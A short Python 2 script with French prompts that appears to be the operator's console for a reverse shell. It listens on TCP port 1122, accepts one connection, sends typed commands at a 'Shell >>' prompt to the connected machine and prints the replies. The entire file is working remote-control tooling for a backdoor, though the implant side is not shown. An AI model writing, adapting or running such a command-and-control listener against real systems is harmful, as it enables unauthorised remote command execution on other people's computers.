import socket

def Connect():

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('', 1122))
    sock.listen(1)

    print '[*] En ecoute sur le port 1122'
    conn, addr = sock.accept()
    print '[*] Connexion depuis: ', addr
    print "Taper 'quitter' pour terminer"
    while True:
        commande = raw_input("Shell >> ")
        if 'quitter' in commande:
            print 'Fermeture de la connexion'
            conn.send('quitter')
            conn.close()
            break

        elif commande != "":
            conn.send(commande)
            print conn.recv(4096)

def Main ():
    Connect()
Main()
